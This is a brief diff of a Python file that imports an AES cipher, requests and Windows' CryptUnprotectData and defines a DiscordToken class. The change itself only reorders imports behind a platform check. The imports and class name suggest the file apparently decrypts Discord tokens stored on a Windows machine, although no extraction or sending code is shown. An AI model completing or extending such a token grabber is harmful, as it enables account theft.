@@ -8,9 +8,10 @@ import re
 import requests
 from Cryptodome.Cipher import AES
 
-assert sys.platform == "win32"
+if sys.platform == "win32":
+    from win32crypt import CryptUnprotectData  # type: ignore[import-not-found]
 
-from win32crypt import CryptUnprotectData
+assert sys.platform == "win32"
 
 
 class DiscordToken:
